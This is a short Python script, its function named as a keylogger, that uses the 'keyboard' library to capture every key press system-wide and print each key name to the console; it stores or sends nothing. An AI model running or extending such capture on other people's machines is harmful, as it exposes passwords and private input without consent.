import keyboard


def basicallyakeyloger():
    while True:
        # Wait for the next event.
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            print(event.name)  # to check key name


if __name__ == "__main__":
    basicallyakeyloger()
